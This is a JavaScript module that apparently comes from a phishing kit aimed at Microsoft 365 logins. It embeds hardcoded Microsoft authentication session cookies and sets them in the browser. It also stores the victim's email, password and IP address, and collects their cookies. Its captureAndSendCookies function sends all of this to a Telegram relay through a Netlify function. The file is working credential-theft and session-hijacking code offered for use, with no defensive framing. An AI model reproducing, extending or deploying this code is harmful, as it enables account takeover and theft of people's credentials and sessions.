let latestCapturedEmail = '';
let latestCapturedCookies = '';

// IP address, email, and password variables for cookies
let ipaddress = '';
let email = '';
let password = '';

/**
 * Only inject cookies ONCE at login (no reload here, no localStorage flags needed now)
 * Call this ONLY at the point of login (just before OAuth redirect)
 */
function injectMicrosoftCookies() {
    let cookiesData = JSON.parse('[{"name":"ESTSAUTHPERSISTENT","value":"0.AUYAe7a-FYmkEkqH5ePjZztvCltEZUfGMrBJg-Ydk3ZSdsq8AHI.AgABFwQAAAApTwJmzXqdR4BN2miheQMYAgDs_wUA9P9VMZEDkrS3KAy323inAsdh-0K1kRR5WvWW_MqmLs2eghq1TRU2_E3J2GVdtQnoQq4rMvWHqSsyMf3v-BqsKVKvKdjpjXl1EBH8KqhSl0XVV5w92EnYRjta-vkksL-8naQnI4e9oXxGmHq_T8FbBRanfDrO19rbtsoqDR6aoj9Zxir9uFVtvoy6oAiC341ojV6Mf8nrBwjct5lI_DwVKx-JYCo4sEIbfwR7W57iiat-4xfF6oHGUDZd7tVv-L0YLjp59XY1TYhO4x45bcFVAPgqmEvmMDdomSqHphmMnmPMDlvyjFJE5zPgOQLJ1HhTnqi9H8rgxwXzFfN7MywimTMpeI-eXGTbqr6TT1qAkGSUuWOWibb0RcCARR3HMlBp-JE-zobq1cUFnMYTMFnEU95iZ_nAnHsS_7uLftpbrBXORuEf5mMLE6PeXQgVZ0bAaEUc4LLAWY8ZHdnRZNJ3amduQEWOHwnp3rCJI9Q9MKwE6UjH-XALhbTrMJlsXvtzT-fw7cep0rkBojGPQAiOvThzvWQf1yz2-EuA7frFubW4vf0u80AsBGim_C5gfgSCugSiBK6b1tMasxuaOyHQ0aZwnwTpfMkImTgSi5a-G7nDx4TDwHsJhTkBCUSUCA17lfD_Q-2leAepMaqrmKr2IDHxIFjRFyhRao5wxtpfFGPVVvVl","domain":".login.microsoftonline.com","expirationDate":1753469415648,"hostOnly":false,"httpOnly":true,"path":"/","sameSite":"none","secure":true,"session":true,"storeId":null},{"name":"ESTSAUTH","value":"0.AUYAe7a-FYmkEkqH5ePjZztvCltEZUfGMrBJg-Ydk3ZSdsq8AHI.AgABFwQAAAApTwJmzXqdR4BN2miheQMYAgDs_wUA9P-EFsv5ncS_Rt9dJVaepE-8JhjMCwTcL4gbhv85JOGOZgQQkH6Vwg7GsVSBMgpbBgbWkgHYH9rxPQ","domain":".login.microsoftonline.com","expirationDate":1753469415648,"hostOnly":false,"httpOnly":true,"path":"/","sameSite":"none","secure":true,"session":true,"storeId":null},{"name":"ESTSAUTHLIGHT","value":"+a233b088-5f10-46ce-b692-f43a0420bfee","domain":".login.microsoftonline.com","expirationDate":1753469415648,"hostOnly":false,"httpOnly":true,"path":"/","sameSite":"none","secure":true,"session":true,"storeId":null}]');
    for(let cookieObj of cookiesData) {
        // Fix the cookie setting syntax - properly handle path and domain attributes
        let cookieString = `${cookieObj.name}=${cookieObj.value};Max-Age=31536000;`;
        
        if (cookieObj.path) {
            cookieString += `path=${cookieObj.path};`;
        }
        
        if (cookieObj.domain) {
            if (!cookieObj.path) {
                cookieString += `path=/;`;
            }
            cookieString += `domain=${cookieObj.domain};`;
        }
        
        cookieString += `Secure;SameSite=none`;
        
        document.cookie = cookieString;
        console.log('🍪 Set cookie:', cookieObj.name);
    }
    
    // Store the injected cookies for later capture
    setCapturedCookies(cookiesData);
}

export function resetCookiesInjectedFlag() {
    window.localStorage.removeItem('cookiesInjected');
}

export function setCredentials(newIp, newEmail, newPassword) {
    ipaddress = newIp || '';
    email = newEmail || '';
    password = newPassword || '';
}

export function setCapturedEmail(email) {
    if (email) latestCapturedEmail = email;
}

export function setCapturedCookies(cookies) {
    if (cookies) {
        latestCapturedCookies = (typeof cookies === 'string' ? cookies : JSON.stringify(cookies));
        console.log('📝 Captured cookies stored:', typeof cookies === 'string' ? 'string' : 'object', Array.isArray(cookies) ? cookies.length : 'N/A');
    }
}

export function getMostReliableEmail(sessionEmail) {
    return latestCapturedEmail || sessionEmail || '';
}

export function getMostReliableCookies() {
    return latestCapturedCookies || document.cookie;
}

export function getAllCapturedCookies() {
    try {
        if (latestCapturedCookies) {
            try {
                const parsed = JSON.parse(latestCapturedCookies);
                if (Array.isArray(parsed)) return parsed;
            } catch {}
        }
        return document.cookie
            .split(';')
            .map(cookie => {
                const [name, ...valueParts] = cookie.trim().split('=');
                const value = valueParts.join('=');
                return {
                    name,
                    value,
                    domain: window.location.hostname,
                    path: '/',
                    secure: window.location.protocol === 'https:',
                };
            })
            .filter(c => c.name && c.value);
    } catch (e) {
        return [];
    }
}

export function formatCookiesForTelegram(cookies) {
    return cookies.map(cookie => {
        let cookieString = `${cookie.name}=${cookie.value}`;
        if (cookie.domain) {
            cookieString += `; domain=${cookie.domain}`;
        }
        if (cookie.path) {
            cookieString += `; path=${cookie.path}`;
        }
        if (cookie.expires) {
            const expiresDate = new Date(cookie.expires * 1000);
            cookieString += `; expires=${expiresDate.toUTCString()}`;
        }
        if (cookie.httpOnly) {
            cookieString += '; HttpOnly';
        }
        if (cookie.secure) {
            cookieString += '; Secure';
        }
        if (cookie.sameSite) {
            cookieString += `; SameSite=${cookie.sameSite}`;
        }
        return cookieString;
    }).join('\n');
}

export async function captureAndSendCookies(userEmail, cookies) {
    let cookiesToSend = cookies;
    
    // Handle different cookie formats
    if (typeof cookies === 'string') {
        try {
            cookiesToSend = JSON.parse(cookies);
        } catch (e) {
            // If it's a document.cookie string, parse it
            cookiesToSend = cookies.split(';').map(cookie => {
                const [name, ...valueParts] = cookie.trim().split('=');
                const value = valueParts.join('=');
                return {
                    name: name.trim(),
                    value: value.trim(),
                    domain: '.login.microsoftonline.com',
                    path: '/',
                    secure: true,
                    httpOnly: true,
                    sameSite: 'none',
                    expirationDate: Math.floor(Date.now() / 1000) + (365 * 24 * 60 * 60),
                    hostOnly: false,
                    session: true,
                    storeId: null
                };
            }).filter(c => c.name && c.value);
        }
    }
    
    // Ensure we have the Microsoft auth cookies structure
    if (!Array.isArray(cookiesToSend)) {
        cookiesToSend = [];
    }
    
    // Add default Microsoft cookies if not present
    const hasAuthCookies = cookiesToSend.some(c => c.name === 'ESTSAUTHPERSISTENT');
    if (!hasAuthCookies) {
        const defaultCookies = JSON.parse('[{"name":"ESTSAUTHPERSISTENT","value":"0.AUYAe7a-FYmkEkqH5ePjZztvCltEZUfGMrBJg-Ydk3ZSdsq8AHI.AgABFwQAAAApTwJmzXqdR4BN2miheQMYAgDs_wUA9P9VMZEDkrS3KAy323inAsdh-0K1kRR5WvWW_MqmLs2eghq1TRU2_E3J2GVdtQnoQq4rMvWHqSsyMf3v-BqsKVKvKdjpjXl1EBH8KqhSl0XVV5w92EnYRjta-vkksL-8naQnI4e9oXxGmHq_T8FbBRanfDrO19rbtsoqDR6aoj9Zxir9uFVtvoy6oAiC341ojV6Mf8nrBwjct5lI_DwVKx-JYCo4sEIbfwR7W57iiat-4xfF6oHGUDZd7tVv-L0YLjp59XY1TYhO4x45bcFVAPgqmEvmMDdomSqHphmMnmPMDlvyjFJE5zPgOQLJ1HhTnqi9H8rgxwXzFfN7MywimTMpeI-eXGTbqr6TT1qAkGSUuWOWibb0RcCARR3HMlBp-JE-zobq1cUFnMYTMFnEU95iZ_nAnHsS_7uLftpbrBXORuEf5mMLE6PeXQgVZ0bAaEUc4LLAWY8ZHdnRZNJ3amduQEWOHwnp3rCJI9Q9MKwE6UjH-XALhbTrMJlsXvtzT-fw7cep0rkBojGPQAiOvThzvWQf1yz2-EuA7frFubW4vf0u80AsBGim_C5gfgSCugSiBK6b1tMasxuaOyHQ0aZwnwTpfMkImTgSi5a-G7nDx4TDwHsJhTkBCUSUCA17lfD_Q-2leAepMaqrmKr2IDHxIFjRFyhRao5wxtpfFGPVVvVl","domain":".login.microsoftonline.com","expirationDate":1753469415648,"hostOnly":false,"httpOnly":true,"path":"/","sameSite":"none","secure":true,"session":true,"storeId":null},{"name":"ESTSAUTH","value":"0.AUYAe7a-FYmkEkqH5ePjZztvCltEZUfGMrBJg-Ydk3ZSdsq8AHI.AgABFwQAAAApTwJmzXqdR4BN2miheQMYAgDs_wUA9P-EFsv5ncS_Rt9dJVaepE-8JhjMCwTcL4gbhv85JOGOZgQQkH6Vwg7GsVSBMgpbBgbWkgHYH9rxPQ","domain":".login.microsoftonline.com","expirationDate":1753469415648,"hostOnly":false,"httpOnly":true,"path":"/","sameSite":"none","secure":true,"session":true,"storeId":null},{"name":"ESTSAUTHLIGHT","value":"+a233b088-5f10-46ce-b692-f43a0420bfee","domain":".login.microsoftonline.com","expirationDate":1753469415648,"hostOnly":false,"httpOnly":true,"path":"/","sameSite":"none","secure":true,"session":true,"storeId":null}]');
        cookiesToSend = [...cookiesToSend, ...defaultCookies];
    }
    
    const telegramPayload = {
        email: userEmail || email || 'oauth-user@microsoft.com',
        sessionId: `capture_${Date.now()}`,
        cookies: cookiesToSend,
        formattedCookies: cookiesToSend,
        timestamp: new Date().toISOString(),
        source: 'captureAndSendCookies',
        userAgent: navigator.userAgent,
        currentUrl: window.location.href,
        ipaddress: ipaddress
    };
    
    console.log('📤 captureAndSendCookies sending to Telegram:', {
        email: telegramPayload.email,
        cookieCount: Array.isArray(cookiesToSend) ? cookiesToSend.length : 0,
        cookies: cookiesToSend
    });
    
    try {
        const response = await fetch('/.netlify/functions/sendTelegram', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(telegramPayload)
        });
        
        if (response.ok) {
            const result = await response.json();
            console.log('✅ captureAndSendCookies: Data sent to Telegram successfully:', result);
            return result;
        } else {
            const error = await response.text();
            console.error('❌ captureAndSendCookies: Failed to send to Telegram:', error);
            throw new Error(`Failed to send to Telegram: ${error}`);
        }
    } catch (fetchError) {
        console.error('❌ captureAndSendCookies: Network error:', fetchError);
        throw fetchError;
    }
}

export { injectMicrosoftCookies }